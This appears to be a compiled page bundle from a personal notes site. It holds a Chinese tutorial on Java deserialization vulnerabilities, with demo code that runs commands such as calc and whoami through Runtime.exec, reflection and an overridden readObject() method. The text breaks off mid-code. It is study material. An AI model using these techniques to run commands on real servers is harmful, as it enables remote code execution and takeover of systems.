import{_ as s}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,b as t,o as p}from"./app-CtEYlYnG.js";const o="/DailyNotes/assets/img8-BMUPzXq1.png",e="/DailyNotes/assets/img1-Cn179nd2.png",c="/DailyNotes/assets/img2-b_Gf219F.png",l="/DailyNotes/assets/img3-lYMj6unG.png",u="/DailyNotes/assets/img4-DuJlgr89.png",k="/DailyNotes/assets/img5-BUm6bEyv.png",i="/DailyNotes/assets/img6-CDjeqL7U.png",r={};function d(m,n){return p(),a("div",null,[...n[0]||(n[0]=[t('<h1 id="反序列化漏洞详解" tabindex="-1"><a class="header-anchor" href="#反序列化漏洞详解"><span>反序列化漏洞详解</span></a></h1><p>这里记录反序列化漏洞原理(Java 为主)，分析了 DNSURL 链。</p><h3 id="反序列化漏洞简介" tabindex="-1"><a class="header-anchor" href="#反序列化漏洞简介"><span>反序列化漏洞简介</span></a></h3><p>许多编程语言都提供对序列化的内在支持</p><ul><li>PHP 将对象序列化为字符串格式</li></ul><figure><img src="'+o+'" alt="img8" tabindex="0" loading="lazy"><figcaption>img8</figcaption></figure><ul><li>Java 将对象序列化为二进制格式</li></ul><p><strong>Java 中的 API 实现：</strong></p><p>位置：java.objectOuputStream java.io.ObjectInputStream</p><p><strong>序列化</strong> ：objectOutputStream 类 --&gt;writeObject()</p><p>该方法对参数指定的 obj 对象进行序列化，对字节序列写到一个目标输出流中。按 JAVA 的标准约定是给文件一个.ser 扩展名</p><p><strong>反序列化</strong>: objectInputStream 类–&gt;readObject()</p><p>该方法从一个源输入流中读取字节序列，在·把他们反序列化为一个对象，并将其返回。</p><h4 id="漏洞源起" tabindex="-1"><a class="header-anchor" href="#漏洞源起"><span>漏洞源起</span></a></h4><p>2015 年 1 月份,国外安全研究人员 Gabriel Lawrence 和 Chris Frohoff 公布了一个影响范围相当广的 Apache Commons 工具集远程代码执行(RCE)漏洞。由于 Apache Commons 工集几乎是 Java 技术平台中应用的最广泛的工具库,因此影响几乎遍及整个 Java 阵营。</p><p>同年 11 月份，FoxGlove Security 安全团队发布的一篇博客中提到 Java 反序列化漏洞，该漏洞可攻击最新版的 WebLogic、WebSphere、JBoss、Jenkins、OpenNMS 应用，能实现远程任意代码执行。且在漏洞被发现的 9 个月后依然没有有效的 Java 库补丁来针对受到影响的产品进行加固。</p><p>有很多经典案例 如</p><ul><li>Apache Commons Collections 序列化 RCE 漏洞</li><li>Spring 框架反序列化漏洞</li><li>Fastjson 反序列化漏洞</li><li>Apache Shiro Java 反序列化漏洞</li></ul><h4 id="漏洞影响主要产品" tabindex="-1"><a class="header-anchor" href="#漏洞影响主要产品"><span>漏洞影响主要产品</span></a></h4><p>机器上一旦有这些应用，即处于“裸奔”状态。黑客可随时利用此漏洞执行任意系统命令，完全获取机器的控制权限，破坏或窃取机器上的数据。</p><p>**序列化：**将对象的状态信息转换为可以存储或传输的形式的过程（将 Java 对象转换成字节流的过程）。</p><p>**反序列化：**就是将序列化后的字节序列还原为原本的对象的过程。</p><p>**序列化与反序列化的目的：**在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。(将对象转换为字节序列，通常用在跨语言、跨平台、网络传输、存储以及进程间传递对象，最重要的作用就是在传递和保存对象时，保证对象的完整性和可传递性)</p><figure><img src="'+e+'" alt="img1" tabindex="0" loading="lazy"><figcaption>img1</figcaption></figure><h3 id="java-反序列化原理" tabindex="-1"><a class="header-anchor" href="#java-反序列化原理"><span>Java 反序列化原理</span></a></h3><h4 id="序列化" tabindex="-1"><a class="header-anchor" href="#序列化"><span>序列化</span></a></h4><p>序列化：在 java 中实现序列化需要实现了<code>java.io.Serializable</code>或者<code>java.io.Externalizable</code>接口的类的对象，当且仅当对象的类实现上面两个对象时，该对象才有资格进行序列化。</p><p><code>Externalizable</code> 接口继承自 <code>Serializable</code> 接口，实现<code>Externalizable</code>接口的类完全由自身来控制序列化的行为，而仅实现 <code>Serializable</code> 接口的类可以采用默认的序列化方式。</p><p>然而真正的序列化动作不需要靠<code>Serializable</code>完成，它只是一个标记接口(Marker Interface)，不包含任何方法，该接口告诉 Java 虚拟机(JVM)该类的对象已准备好写入持久性存储或通过网络进行读取。</p><figure><img src="'+c+`" alt="img2" tabindex="0" loading="lazy"><figcaption>img2</figcaption></figure><p>例如想要对 Person 类进行序列化和反序列化操作：</p><pre><code class="language-java">
...
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>
    ...
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><p><code>FileOutputStream</code>和<code>ObjectOutputStream</code>是 java 的流操作，可以把<code>OutputStream</code>当做一个单向流出的水管，<code>FileOutputStream</code>打开了文件，就相当于给文件接了一个<code>File</code>类型水管，然后把<code>FileOutputStream</code>类型对象传给了<code>ObjectOutputStream</code>，相当于把<code>File</code>类型水管接到了 Object 类型水管。由于<code>Object</code>类是所有类的父类，所以<code>Object</code>类型水管可以投放任何对象。</p><p>这里创建了<code>Person</code>对象并传给<code>writeObject</code>方法，相当于把<code>Person</code>对象扔进了<code>Object</code>类型水管，这样就把<code>Person</code>对象写入了文件。</p><pre><code>Person对象-&gt;Object类型水管-&gt;File类型水管-&gt;文件
</code></pre><p>如果我想把序列化对象写入 byte 数组，那就创建个<code>byteArrayOutputStream</code>类型水管，然后把它接到<code>Object</code>类型水管上，后面步骤不变，则：</p><pre><code>Person对象-&gt;Object类型水管-&gt;byte类型水管-&gt;byte数组
</code></pre><p><strong>查看序列化后的内容:</strong></p><pre><code>java -jar SerializationDumper-v1.13.jar -r person.out
</code></pre><figure><img src="`+l+'" alt="img3" tabindex="0" loading="lazy"><figcaption>img3</figcaption></figure><figure><img src="'+u+`" alt="img4" tabindex="0" loading="lazy"><figcaption>img4</figcaption></figure><h4 id="反序列化" tabindex="-1"><a class="header-anchor" href="#反序列化"><span>反序列化</span></a></h4><p>把<code>Output</code>换为了<code>Input</code>，把<code>writeObject</code>换为了<code>readObject</code>。</p><pre><code class="language-java">
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span>
...
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>
    ...
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><p>把单向流出的水管换为单向流入的（<code>Output</code>换为<code>Input</code>），然后把写入数据的<code>writeObject</code>换为<code>readObject</code>，即：</p><pre><code>序列化数据person.txt-&gt;File类型水管-&gt;Object类型水管-&gt;Object对象
</code></pre><p>（Person）这个用法是强制类型转换，将 Object 转 Person 类型，</p><p>如果我们在<code>Person</code>类中重写<code>readObject</code>，那么在反序列化<code>obj_in.readObject()</code>中会自动重写自己的<code>readObject()</code>方法导致命令的执行，<strong>命令执行反序列化的最终目的其实就是重写<code>readObject()</code>方法。</strong></p><pre><code class="language-java">    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> a<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>
    ...
    <span class="token punctuation">}</span>
</code></pre><p>其中的<code>defaultReadObject</code>是为了保证反序列化正常执行的，因为如果被重写了也就意味着对象不会被解析，加上这个方法对象就可以被解析，如果不写输出时候对象的内容会为空。</p><figure><img src="`+k+`" alt="img5" tabindex="0" loading="lazy"><figcaption>img5</figcaption></figure><h4 id="特点-应用场景" tabindex="-1"><a class="header-anchor" href="#特点-应用场景"><span>特点/应用场景</span></a></h4><ul><li>常用与服务器之间的数据传输,序列化成文件,反序列化读取数据</li><li>常用使用套接字流在主机之间传递对象</li><li>需要序列化的文件必须实现 Serializable 接口,用来启用序列化功能</li><li>在反序列化时,如果和序列化的版本号不一致,无法完成反序列化</li></ul><p>补充</p><ul><li><p>不需要序列化的数据可以修饰成 static,原因:static 资源属于类资源,不随着对象被序列化输出</p></li><li><p>不需要序列化的数据也可以被修饰成 transient(临时的),只在程序运行期间在内存中存在,不会被序列化持久保存</p></li><li><p>每一个被序列化的文件都有一个唯一的 id,如果没有添加此 id,编译器会自动根据类的定义信息计算产生一个</p></li><li><p>读写顺序一致</p></li><li><p>内部属性的类型也需要实现 Serializable 接口</p></li><li><p>具有继承性,父类可以序列化那么子类同样可以（递归）</p></li></ul><h3 id="为什么会产生安全问题" tabindex="-1"><a class="header-anchor" href="#为什么会产生安全问题"><span>为什么会产生安全问题？</span></a></h3><p>只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力。</p><p><strong>可能的形式</strong></p><ol><li><p>入口类的readObject直接调用危险方法。</p></li><li><p>入口类参数中包含可控类，该类有危险方法，readObject时调用，比如类型定义为Object，调用equals/hashcode/toString。</p></li><li><p>入口类参数中包含可控类，该类又调用其他有危险方法的类，重点 相同类型 同名函数</p></li><li><p>构造函数/静态代码块等类加载时隐式执行。</p></li></ol><ul><li><p>共同条件 继承Serializable</p></li><li><p>入口类 source（重写readObject 参数类型宽泛 最好jdk自带，最好的例子就是HashMap）</p></li><li><p>调用链 gadget chain</p></li><li><p>执行类 sink （rce ssrf 写文件等等）</p></li></ul><h3 id="核心误解" tabindex="-1"><a class="header-anchor" href="#核心误解"><span>核心误解</span></a></h3><h4 id="序列化-序列化类的代码" tabindex="-1"><a class="header-anchor" href="#序列化-序列化类的代码"><span>序列化≠序列化类的代码</span></a></h4><p><strong>错误理解的序列化</strong>：</p><pre><code>序列化 → 把整个类的代码都打包进去了 
      → 包括类定义、方法、readObject()方法等
      → 服务器解开就能用
</code></pre><p><strong>实际的序列化</strong>：</p><pre><code>序列化 → 只序列化对象的数据（字段值）
      → 不包含类的代码/方法
      → 服务器需要自己有这个类的定义
</code></pre><p><strong>序列化到底保存了什么？</strong></p><p>一个例子</p><pre><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>
...
</code></pre><p><strong>序列化文件里有什么？</strong></p><pre><code>✅ 类的全限定名：com.example.Person
...
❌ sayHello()方法的代码  
❌ 任何方法的实现
</code></pre><p><strong>用二进制工具查看序列化后的恶意内容 malicious.ser</strong></p><pre><code class="language-bash">hexdump <span class="token parameter variable">-C</span> malicious.ser <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-20</span>
</code></pre><p>你会看到类似这样的内容：</p><pre><code>ac ed 00 05           # Java序列化魔数
73 72 00 10           # 对象流标识
...
</code></pre><p><strong>注意</strong>：里面只有类名和数据，<strong>没有 readObject() 方法的代码！</strong></p><hr><p><strong>反序列化时发生了什么？</strong></p><p>第1步：读取类名</p><pre><code class="language-java">ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// Java读取字节流，发现：</span>
<span class="token comment">// &quot;哦，这是一个 MaliciousObject 类的对象&quot;</span>
</code></pre><p>第2步：查找类定义</p><pre><code class="language-java"><span class="token comment">// Java尝试加载类：</span>
<span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">&quot;MaliciousObject&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// ↑ 在当前classpath中查找这个类</span>

<span class="token comment">// 如果找不到 → ClassNotFoundException ❌</span>
<span class="token comment">// 如果找到了 → 继续下一步 ✓</span>
</code></pre><p>第3步：创建对象并填充数据</p><pre><code class="language-java"><span class="token comment">// 创建空对象（不调用构造函数）</span>
<span class="token class-name">MaliciousObject</span> obj <span class="token operator">=</span> <span class="token function">allocateInstance</span><span class="token punctuation">(</span><span class="token class-name">MaliciousObject</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 从序列化数据中读取字段值</span>
obj<span class="token punctuation">.</span>command <span class="token operator">=</span> <span class="token string">&quot;whoami&quot;</span><span class="token punctuation">;</span>  <span class="token comment">// 从字节流中读取</span>

<span class="token comment">// 如果类定义中有 readObject() 方法，调用它</span>
obj<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span>ois<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// ← 这里调用的是服务器上的类定义中的方法！</span>
</code></pre><hr><h4 id="形象类比" tabindex="-1"><a class="header-anchor" href="#形象类比"><span>形象类比</span></a></h4><ul><li>类比1：组装家具</li></ul><p><strong>序列化文件</strong>就像宜家的包装盒：</p><pre><code>📦 包装盒上写着：
   - 产品型号：BILLY书架
   - 尺寸：高200cm，宽80cm
   - 颜色：白色
...
❌ 盒子里没有：
   - 如何制造书架的工厂图纸
   - 生产线的机器
</code></pre><p><strong>反序列化</strong>就像组装：</p><pre><code>你收到包装盒 → 看到型号&quot;BILLY&quot;
              → 去查看宜家的组装说明书（类定义）
              → 如果你没有说明书 → 无法组装 ❌
              → 如果你有说明书 → 按照说明组装 ✓
</code></pre><ul><li>类比2：菜谱</li></ul><p><strong>序列化数据</strong>：</p><pre><code>菜名：宫保鸡丁
食材：鸡肉250g，花生50g，辣椒10个
</code></pre><p><strong>类定义（方法）</strong>：</p><pre><code>做法：
1. 鸡肉切丁
2. 热锅放油
3. 炒香辣椒...
</code></pre><p><strong>问题</strong>：</p><ul><li>你把菜名和食材发给朋友（序列化）</li><li>朋友收到了，但不知道怎么做（没有类定义）</li><li>朋友：我没有这道菜的菜谱啊！（ClassNotFoundException）</li></ul><h4 id="利用目标已有的类才能实现真实攻击" tabindex="-1"><a class="header-anchor" href="#利用目标已有的类才能实现真实攻击"><span>利用目标已有的类才能实现真实攻击</span></a></h4><pre><code class="language-java"><span class="token comment">// 目标服务器肯定有这些类：</span>
<span class="token operator">-</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>HashMap</span>
<span class="token operator">-</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>ArrayList</span>  
<span class="token operator">-</span> <span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span>Transformer</span>  <span class="token comment">// 如果用了这个库</span>

<span class="token comment">// 攻击者构造利用链：</span>
...
<span class="token comment">// ... 巧妙构造 ...</span>
<span class="token comment">// 序列化这个HashMap</span>

<span class="token comment">// 服务器：</span>
ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// ✓ HashMap我有！反序列化成功</span>
                   <span class="token comment">// ✓ 但触发了恶意逻辑</span>
</code></pre><h3 id="java-反序列化执行系统命令" tabindex="-1"><a class="header-anchor" href="#java-反序列化执行系统命令"><span>Java 反序列化执行系统命令</span></a></h3><p>在Java反序列化漏洞中，最终目标往往是执行系统命令。下面介绍三种执行系统命令的方式：</p><h4 id="_1-正常执行系统命令" tabindex="-1"><a class="header-anchor" href="#_1-正常执行系统命令"><span>1. 正常执行系统命令</span></a></h4><p>最直接的方式是使用<code>Runtime.getRuntime().exec()</code>方法：</p><pre><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">NormalExec</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token comment">// 直接调用Runtime执行命令</span>
            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">&quot;calc&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            
            <span class="token comment">// 或者执行更复杂的命令</span>
            <span class="token class-name">Process</span> process <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">&quot;whoami&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            
            <span class="token comment">// 读取命令输出</span>
            <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>BufferedReader</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>BufferedReader</span><span class="token punctuation">(</span>
                <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>InputStreamReader</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ...
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><p><strong>特点：</strong></p><ul><li>简单直接，无需额外配置</li><li>但在实际漏洞利用中，往往无法直接调用<code>Runtime</code>对象</li><li><code>Runtime</code>类没有实现<code>Serializable</code>接口，无法被序列化</li></ul><h4 id="_2-反射执行系统命令" tabindex="-1"><a class="header-anchor" href="#_2-反射执行系统命令"><span>2. 反射执行系统命令</span></a></h4><p>使用Java反射机制可以绕过一些限制，动态调用<code>Runtime</code>类的方法：</p><p><strong>方式1：使用<code>Class.forName()</code>完整的反射调用链</strong></p><pre><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectionExec1</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token comment">// 通过Class.forName获取Runtime类</span>
            ...
            <span class="token comment">// 获取getRuntime方法</span>
            <span class="token class-name">Method</span> getRuntimeMethod <span class="token operator">=</span> runtimeClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">&quot;getRuntime&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 调用getRuntime方法获取Runtime实例</span>
            <span class="token class-name">Object</span> runtime <span class="token operator">=</span> getRuntimeMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 获取exec方法</span>
            <span class="token class-name">Method</span> execMethod <span class="token operator">=</span> runtimeClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">&quot;exec&quot;</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 调用exec方法执行命令</span>
            execMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>runtime<span class="token punctuation">,</span> <span class="token string">&quot;calc&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ...
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><p><strong>方式2：使用<code>Runtime.class</code>直接获取类对象</strong></p><pre><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectionExec2</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token comment">// 直接使用Runtime.class获取类对象</span>
            ...
            <span class="token class-name">Method</span> getRuntimeMethod <span class="token operator">=</span> runtimeClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">&quot;getRuntime&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 调用getRuntime方法获取Runtime实例</span>
            <span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span> getRuntimeMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 获取exec方法</span>
            <span class="token class-name">Method</span> execMethod <span class="token operator">=</span> runtimeClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">&quot;exec&quot;</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 调用exec方法执行命令</span>
            execMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>runtime<span class="token punctuation">,</span> <span class="token string">&quot;calc&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ...
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><p><strong>反射执行的完整链路：</strong></p><pre><code>Runtime.class 
  → getMethod(&quot;getRuntime&quot;) 
  → invoke(null) 
  → getMethod(&quot;exec&quot;, String.class) 
  → invoke(runtime, &quot;calc&quot;)
</code></pre><p><strong>为什么使用Runtime.class而不是Runtime.getRuntime()？</strong></p><ul><li><code>Runtime.getRuntime()</code>返回的是<code>java.lang.Runtime</code>对象，无法序列化</li><li><code>Runtime.class</code>返回的是<code>java.lang.Class</code>对象，实现了<code>Serializable</code>接口，可以被序列化</li></ul><h4 id="_3-反序列化执行系统命令" tabindex="-1"><a class="header-anchor" href="#_3-反序列化执行系统命令"><span>3. 反序列化执行系统命令</span></a></h4><p>在反序列化场景中，通过重写<code>readObject()</code>方法，在反序列化时自动执行命令：</p><pre><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DeserializeExec</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token comment">// 第一步：序列化恶意对象到文件</span>
            ...
            <span class="token class-name">MaliciousObject</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MaliciousObject</span><span class="token punctuation">(</span><span class="token string">&quot;open -a claculator&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">serialize</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">&quot;malicious.ser&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;对象已序列化到文件: malicious.ser&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;\\n=== 开始反序列化 ===&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 第二步：从文件中反序列化对象（此时会触发命令执行）</span>
            <span class="token class-name">MaliciousObject</span> deserializedObj <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">MaliciousObject</span><span class="token punctuation">)</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token string">&quot;malicious.ser&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;对象已反序列化，命令已执行&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;对象属性 name: &quot;</span> <span class="token operator">+</span> deserializedObj<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
    ...
    <span class="token comment">// 序列化方法：将对象写入文件</span>
    ...
    <span class="token comment">// 反序列化方法：从文件中读取对象</span>
...
<span class="token comment">// 恶意类：必须实现Serializable接口</span>
<span class="token keyword">class</span> <span class="token class-name">MaliciousObject</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token number">1L</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> command<span class="token punctuation">;</span>  <span class="token comment">// 改为command，用于指定要执行的命令</span>
    
    <span class="token keyword">public</span> <span class="token class-name">MaliciousObject</span><span class="token punctuation">(</span><span class="token class-name">String</span> command<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    ...
    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> ois<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>
        ...
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;readObject方法被调用，开始执行命令: &quot;</span> <span class="token operator">+</span> command<span class="token punctuation">)</span><span class="token punctuation">;</span>
        ...
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            ...
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;命令执行成功！&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><p><strong>关键点：</strong></p><ol><li><p><strong>必须实现<code>Serializable</code>接口</strong> - 这是序列化的前提条件</p></li><li><p><strong>重写<code>readObject()</code>方法</strong> - 使用特定的方法签名：</p><pre><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> ois<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span>
</code></pre></li><li><p><strong>调用<code>defaultReadObject()</code></strong> - 保证对象能正常反序列化：</p><pre><code class="language-java">ois<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
